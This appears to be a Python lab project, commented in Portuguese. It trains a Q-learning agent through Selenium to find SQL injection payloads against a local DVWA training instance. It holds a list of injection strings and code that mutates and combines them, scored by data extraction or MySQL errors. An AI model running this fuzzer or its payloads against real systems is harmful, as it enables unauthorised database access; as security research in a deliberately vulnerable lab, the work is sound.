import gymnasium as gym
from gymnasium import spaces
import numpy as np
import random
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
import matplotlib.pyplot as plt
import os
from collections import Counter

class DVWAEnv(gym.Env):
    def __init__(self):
        super(DVWAEnv, self).__init__()

        self.base_url = "http://192.168.56.101/dvwa"
        self.login_url = self.base_url + "/login.php"
        self.target_url = self.base_url + "/vulnerabilities/sqli/"

        # Componentes para gerar payloads
        self.base_values = ["1", "admin", "test", "user"]
        self.sql_operators = ["'", '"', "''"]
        self.sql_conditions = ["OR", "AND"]
        self.sql_comparisons = ["=", "!=", "<", ">"]
        self.sql_values = ["1", "0", "'1'", "'a'", "true", "false"]
        self.sql_comments = ["--", "#", "/*"]

        # Histórico de payloads e recompensas
        self.payload_history = []
        self.reward_history = []

        # Gera payloads iniciais
        self.generate_initial_payloads()

        # Espaços de ação e estado
        self.action_space = spaces.Discrete(len(self.actions)) # Ações do tamanho de coluna de ações
        self.observation_space = spaces.Discrete(3) # 3 estados sempre

        self.driver = webdriver.Chrome()
        self.login()

    def login(self):
        """Faz login no DVWA e configura segurança"""
        self.driver.get(self.login_url)
        time.sleep(1)

        username = self.driver.find_element(By.NAME, "username")
        username.send_keys("admin")

        password = self.driver.find_element(By.NAME, "password")
        password.send_keys("password")
        password.send_keys(Keys.RETURN)

        time.sleep(1)
        print("✅ Login realizado no DVWA")

        self.driver.get(self.base_url + "/security.php")
        time.sleep(1)

        try:
            dropdown = Select(self.driver.find_element(By.NAME, "security"))
            dropdown.select_by_value("low")

            apply_button = self.driver.find_element(By.NAME, "seclev_submit")
            apply_button.click()

            time.sleep(1)
            print("✅ Nível de segurança alterado para LOW")

        except Exception as e:
            print("❌ Erro ao configurar segurança:", e)

    def generate_initial_payloads(self):
        """Gera payloads iniciais básicos"""
        self.actions = [
            "1",
            "1' OR '1'='1",
            "1' OR 1=1 --",
            "admin",
            "1' OR 'a'='a",
            "1 AND 1=1",
            "' OR 1=1 --",
            "1' UNION SELECT 1--",
            "1' AND 1=1",
            "1' OR (SELECT COUNT(*) FROM users)>0--"
        ]

    def generate_payload(self, strategy="random"):
        """Gera um novo payload baseado em estratégia"""
        if strategy == "random":
            return self.generate_random_payload()
        elif strategy == "mutation":
            return self.mutate_successful_payload()
        elif strategy == "combination":
            return self.combine_successful_patterns()
        else:
            return self.generate_adaptive_payload()

    def generate_random_payload(self):
        """Gera payload completamente aleatório"""
        base = random.choice(self.base_values)
        operator = random.choice(self.sql_operators)

        if random.random() < 0.5:
            condition = random.choice(self.sql_conditions)
            comparison = random.choice(self.sql_comparisons)
            value = random.choice(self.sql_values)
            comment = random.choice(self.sql_comments) if random.random() < 0.7 else ""
            payload = f"{base}{operator} {condition} {base}{comparison}{value} {comment}"
        else:
            payload = f"{base}{operator}"

        return payload

    def mutate_successful_payload(self):
        """Muta payloads que tiveram boas recompensas"""
        if len(self.payload_history) < 3:
            return self.generate_random_payload()

        best_indices = np.argsort(self.reward_history)[-3:]
        best_payloads = [self.payload_history[i] for i in best_indices]
        base_payload = random.choice(best_payloads)

        mutations = [
            lambda p: p.replace("--", "#"),
            lambda p: p.replace("'", '"'),
            lambda p: p + " AND 1=1",
            lambda p: p.replace("OR", "AND"),
            lambda p: p.replace("1", "admin")
        ]

        mutation = random.choice(mutations)

        try:
            return mutation(base_payload)
        except:
            return self.generate_random_payload()

    def combine_successful_patterns(self):
        """Combina padrões de payloads bem-sucedidos"""
        if len(self.payload_history) < 2:
            return self.generate_random_payload()

        successful_payloads = []
        for i, reward in enumerate(self.reward_history):
            if reward > 0:
                successful_payloads.append(self.payload_history[i])

        if len(successful_payloads) < 2:
            return self.generate_random_payload()

        patterns = []
        for payload in successful_payloads[:3]:
            if "OR" in payload:
                patterns.append("OR")
            if "AND" in payload:
                patterns.append("AND")
            if "'" in payload:
                patterns.append("'")
            if '"' in payload:
                patterns.append('"')
            if "--" in payload:
                patterns.append("--")

        if len(patterns) >= 2:
            base = random.choice(self.base_values)
            operator = random.choice(self.sql_operators)
            condition = random.choice([p for p in patterns if p in ["OR", "AND"]] or ["OR"])
            comparison = random.choice(self.sql_comparisons)
            value = random.choice(self.sql_values)
            comment = random.choice([p for p in patterns if p in ["--", "#"]] or ["--"])
            return f"{base}{operator} {condition} {base}{comparison}{value} {comment}"

        return self.generate_random_payload()

    def generate_adaptive_payload(self):
        """Gera payload baseado no histórico de recompensas"""
        if len(self.reward_history) == 0:
            return self.generate_random_payload()

        pattern_rewards = {}

        for i, payload in enumerate(self.payload_history):
            reward = self.reward_history[i]

            if "OR" in payload:
                pattern_rewards["OR"] = pattern_rewards.get("OR", 0) + reward
            if "AND" in payload:
                pattern_rewards["AND"] = pattern_rewards.get("AND", 0) + reward
            if "'" in payload:
                pattern_rewards["single_quote"] = pattern_rewards.get("single_quote", 0) + reward
            if '"' in payload:
                pattern_rewards["double_quote"] = pattern_rewards.get("double_quote", 0) + reward
            if "--" in payload:
                pattern_rewards["dash_comment"] = pattern_rewards.get("dash_comment", 0) + reward
            if "#" in payload:
                pattern_rewards["hash_comment"] = pattern_rewards.get("hash_comment", 0) + reward

        if pattern_rewards:
            best_pattern = max(pattern_rewards, key=pattern_rewards.get)

            if best_pattern == "OR":
                return f"{random.choice(self.base_values)}' OR {random.choice(self.sql_values)}={random.choice(self.sql_values)} --"
            elif best_pattern == "AND":
                return f"{random.choice(self.base_values)}' AND {random.choice(self.sql_values)}={random.choice(self.sql_values)}"
            elif best_pattern == "single_quote":
                return f"{random.choice(self.base_values)}' OR 1=1 --"
            elif best_pattern == "double_quote":
                return f'{random.choice(self.base_values)}" OR 1=1 --'

        return self.generate_random_payload()

    def add_new_payload(self, payload):
        """Adiciona um novo payload à lista de ações"""
        if payload not in self.actions:
            self.actions.append(payload)
            self.action_space = spaces.Discrete(len(self.actions))
            print(f"🆕 Novo payload adicionado: {payload}")

    def is_sqli_payload(self, payload):
        """
        Verifica se o payload contém marcadores típicos de SQL Injection.
        Payloads legítimos como "1" ou "admin" não possuem esses caracteres.
        Isso evita falsos positivos onde uma consulta normal retorna dados do banco.

        Um payload de SQL Injection sempre contém pelo menos um desses marcadores:
        aspas simples/duplas para quebrar a query, operadores lógicos (OR/AND),
        comandos SQL (UNION, SELECT, DROP), ou comentários (-- # /*).
        """
        markers = ["'", '"', " or ", " and ", "union", "--", "#", "/*", "select", "drop", "insert"]
        payload_lower = payload.lower()
        return any(marker in payload_lower for marker in markers)

    def step(self, action):
        # Se ação for maior que a lista atual, gera novo payload
        if action >= len(self.actions):
            if len(self.payload_history) < 10:
                strategy = "random"
            elif len(self.payload_history) < 25:
                strategy = "mutation"
            else:
                strategy = "adaptive"

            payload = self.generate_payload(strategy)
            self.add_new_payload(payload)
            action = len(self.actions) - 1
        else:
            payload = self.actions[action]

        self.driver.get(self.target_url)
        time.sleep(0.5)

        try:
            input_box = self.driver.find_element(By.NAME, "id")
            input_box.clear()
            input_box.send_keys(payload)
            input_box.send_keys(Keys.RETURN)
            time.sleep(0.5)

            # ================================================================
            # SISTEMA DE RECOMPENSAS REVISADO
            #
            # A hierarquia abaixo é baseada em severidade de impacto,
            # conforme critérios do OWASP e MITRE CWE Top 25 (2025).
            # A ordem dos IFs importa: do mais severo para o menos severo,
            # evitando que um resultado crítico seja classificado como menor.
            #
            # Estado 2 → Extração de dados confirmada (vulnerabilidade crítica)
            # Estado 1 → Erro MySQL explícito (vulnerabilidade provável)
            # Estado 1 → Comportamento suspeito genérico (pista fraca)
            # Estado 0 → Nenhum indicador de vulnerabilidade / consulta normal
            # ================================================================

            try:
                result_area = self.driver.find_element(By.ID, "main_body")
                page_content = result_area.get_attribute("innerHTML").lower()
            except:
                page_content = self.driver.page_source.lower()

            # Nível 3 — Extração confirmada + payload com marcadores de SQLi
            # Reward +10: vulnerabilidade crítica comprovada, maior impacto
            # O is_sqli_payload() evita falsos positivos de consultas normais
            if "first name:" in page_content and "surname:" in page_content and self.is_sqli_payload(payload):
                state = 2
                reward = 10
                detection_type = "EXTRAÇÃO DE DADOS"

            # Nível 3b — Consulta normal retornou dados (falso positivo evitado)
            # Reward -1: payload sem marcadores de SQLi não é uma vulnerabilidade
            elif "first name:" in page_content and "surname:" in page_content and not self.is_sqli_payload(payload):
                state = 0
                reward = -1
                detection_type = "CONSULTA NORMAL (falso positivo evitado)"

            # Nível 2 — Erro MySQL explícito na resposta
            # Reward +5: indica falha de tratamento com mensagem de banco visível
            elif "you have an error in your sql syntax" in page_content or \
                 "warning: mysql" in page_content or \
                 "mysql_fetch" in page_content or \
                 "mysqli_" in page_content:
                state = 1
                reward = 5
                detection_type = "ERRO MYSQL EXPLÍCITO"

            # Nível 1 — Comportamento suspeito genérico
            # Reward +2: termos relacionados a SQL/erro presentes, sem confirmação forte
            elif "mysql" in page_content or \
                 "sql" in page_content or \
                 "error" in page_content:
                state = 1
                reward = 2
                detection_type = "COMPORTAMENTO SUSPEITO"

            # Nível 0 — Nenhum indicador relevante
            # Reward -1: penalidade para incentivar exploração de payloads melhores
            else:
                state = 0
                reward = -1
                detection_type = "SEM RESULTADO"

            print(f"  → Detecção: {detection_type} | Reward: {reward}")

        except Exception as e:
            state = 0
            reward = -1
            detection_type = "ERRO DE EXECUÇÃO"
            print(f"  → Erro na execução: {e}")

        self.payload_history.append(payload)
        self.reward_history.append(reward)

        done = False
        return state, reward, done, False, {}

    def reset(self, seed=None, options=None):
        return 0, {}

    def close(self):
        self.driver.quit()

    def get_statistics(self):
        """Retorna estatísticas dos payloads testados"""
        if not self.payload_history:
            return "Nenhum payload testado ainda"

        stats = {
            "total_payloads": len(self.payload_history),
            "unique_payloads": len(set(self.payload_history)),
            "best_reward": max(self.reward_history),
            "worst_reward": min(self.reward_history),
            "avg_reward": np.mean(self.reward_history),
            "criticos_reward_10": len([r for r in self.reward_history if r == 10]),
            "erros_mysql_reward_5": len([r for r in self.reward_history if r == 5]),
            "suspeitos_reward_2": len([r for r in self.reward_history if r == 2]),
            "sem_resultado_reward_neg1": len([r for r in self.reward_history if r == -1]),
        }

        return stats


# =============== TREINAMENTO COM GERAÇÃO DINÂMICA ===============

env = DVWAEnv()

q_table = np.zeros((3, env.action_space.n))

alpha = 0.7
gamma = 0.9
epsilon = 1.0
epsilon_decay = 0.99
epsilon_min = 0.05
episodes = 300

payload_generation_interval = 5
next_generation_episode = 5

print("🚀 Iniciando treinamento com geração dinâmica de payloads...")
print(f"Payloads iniciais: {len(env.actions)}")

for episode in range(episodes):
    state, _ = env.reset()

    if random.uniform(0, 1) < epsilon:
        if episode >= next_generation_episode and random.random() < 0.3:
            action = env.action_space.n
            print(f"🎲 Episódio {episode}: Gerando novo payload...")
            next_generation_episode += payload_generation_interval
        else:
            action = env.action_space.sample()
    else:
        action = np.argmax(q_table[state])

    if action >= q_table.shape[1]:
        old_shape = q_table.shape
        q_table = np.pad(q_table, ((0, 0), (0, action - q_table.shape[1] + 1)), 'constant')
        print(f"📈 Q-table expandida: {old_shape} → {q_table.shape}")

    next_state, reward, done, _, _ = env.step(action)

    old_value = q_table[state, action]
    next_max = np.max(q_table[next_state])
    q_table[state, action] = old_value + alpha * (reward + gamma * next_max - old_value)

    epsilon = max(epsilon_min, epsilon * epsilon_decay)

    # Para resolver o problema do aprendizado prematuro, tivemos que implementar um reset de epsilon para que o agente RL consiga continuar explorando e exploitando de forma mais adaptável ao contexto que ele se encontra
    if episode % 50 == 0 and episode > 0:
        epsilon = min(0.3, epsilon * 1.5)
        print(f"Episódio {episode}: epsilon reiniciado para {epsilon:.2f}")

    if action >= len(env.actions):
        print(f"⚠️ Ação {action} inválida, usando ação aleatória")
        action = random.randint(0, len(env.actions) - 1)

    print(f"[{episode}] Payload: {env.actions[action][:50]}... | Reward: {reward} | Testados: {len(env.payload_history)}")

# =============== RESULTADOS FINAIS ===============

best_action = np.argmax(q_table[0])
print("\n🏆 MELHOR PAYLOAD ENCONTRADO:")
print(env.actions[best_action])

print("\n📊 ESTATÍSTICAS FINAIS:")
stats = env.get_statistics()
for key, value in stats.items():
    print(f"  {key}: {value}")

print("\n🔍 TOP 5 PAYLOADS ÚNICOS:")
best_payloads = {}
for payload, reward in zip(env.payload_history, env.reward_history):
    if payload not in best_payloads:
        best_payloads[payload] = reward
    else:
        best_payloads[payload] = max(best_payloads[payload], reward)

top_payloads = sorted(best_payloads.items(), key=lambda x: x[1], reverse=True)[:5]
for i, (payload, reward) in enumerate(top_payloads):
    print(f"  {i+1}. {payload[:60]}... (Melhor Reward: {reward})")

# =============== GRÁFICOS ===============
# Todos os gráficos são salvos como .png na pasta "graficos/"
# Isso evita o problema do PyCharm de não exibir múltiplos plt.show() em sequência

os.makedirs("graficos", exist_ok=True)

rewards = env.reward_history

# --- Gráfico 1: Curva de aprendizado ---
window_size = 5
moving_avg = np.convolve(rewards, np.ones(window_size)/window_size, mode='valid')

plt.figure(figsize=(10, 5))
plt.plot(rewards, label="Reward por episódio")
plt.plot(range(window_size - 1, len(rewards)), moving_avg, linewidth=3, label="Média móvel")
plt.title("Curva de aprendizado do agente RL")
plt.xlabel("Episódios")
plt.ylabel("Reward")
plt.legend()
plt.grid()
plt.savefig("graficos/1_curva_aprendizado.png", dpi=150, bbox_inches="tight")
plt.close()
print("✅ Gráfico salvo: graficos/1_curva_aprendizado.png")

# --- Gráfico 2: Pizza por nível de severidade ---
criticos = sum(1 for r in rewards if r == 10)
erros_mysql = sum(1 for r in rewards if r == 5)
suspeitos = sum(1 for r in rewards if r == 2)
sem_resultado = sum(1 for r in rewards if r == -1)

labels = ["Crítico (+10)", "Erro MySQL (+5)", "Suspeito (+2)", "Sem resultado (-1)"]
values = [criticos, erros_mysql, suspeitos, sem_resultado]
colors = ["#d62728", "#ff7f0e", "#ffdd57", "#aec7e8"]

labels_filtrados = [l for l, v in zip(labels, values) if v > 0]
values_filtrados = [v for v in values if v > 0]
colors_filtrados = [c for c, v in zip(colors, values) if v > 0]

plt.figure(figsize=(7, 7))
plt.pie(values_filtrados, labels=labels_filtrados, autopct='%1.1f%%', colors=colors_filtrados)
plt.title("Distribuição de detecções por nível de severidade")
plt.savefig("graficos/2_pizza_severidade.png", dpi=150, bbox_inches="tight")
plt.close()
print("✅ Gráfico salvo: graficos/2_pizza_severidade.png")

# --- Gráfico 3: Top payloads bem-sucedidos ---
payload_counter = Counter()
for payload, reward in zip(env.payload_history, env.reward_history):
    if reward > 0:
        payload_counter[payload] += 1

top_payloads = payload_counter.most_common(5)

if top_payloads:
    payload_names = [p[0][:25] for p in top_payloads]
    payload_values = [p[1] for p in top_payloads]

    plt.figure(figsize=(10, 5))
    plt.bar(payload_names, payload_values)
    plt.title("Top payloads bem-sucedidos")
    plt.xlabel("Payload")
    plt.ylabel("Quantidade de sucessos")
    plt.xticks(rotation=15)
    plt.tight_layout()
    plt.savefig("graficos/3_top_payloads.png", dpi=150, bbox_inches="tight")
    plt.close()
    print("✅ Gráfico salvo: graficos/3_top_payloads.png")

# --- Gráfico 4: Tipos de SQL Injection explorados ---
categories = {
    "Boolean-Based": 0,
    "UNION-Based": 0,
    "Comment Injection": 0,
    "Authentication Bypass": 0,
    "Error-Based": 0
}

for payload in env.payload_history:
    if "UNION" in payload.upper():
        categories["UNION-Based"] += 1
    if "--" in payload or "#" in payload:
        categories["Comment Injection"] += 1
    if "OR 1=1" in payload or "'1'='1" in payload:
        categories["Authentication Bypass"] += 1
    if "OR" in payload.upper() or "AND" in payload.upper():
        categories["Boolean-Based"] += 1

for reward in env.reward_history:
    if reward >= 5:
        categories["Error-Based"] += 1

plt.figure(figsize=(10, 5))
plt.bar(categories.keys(), categories.values())
plt.title("Tipos de SQL Injection explorados")
plt.ylabel("Ocorrências")
plt.xticks(rotation=10)
plt.tight_layout()
plt.savefig("graficos/4_tipos_sqli.png", dpi=150, bbox_inches="tight")
plt.close()
print("✅ Gráfico salvo: graficos/4_tipos_sqli.png")

print("\n📁 Todos os gráficos foram salvos na pasta 'graficos/'")
print("   Abra a pasta no PyCharm para visualizá-los.")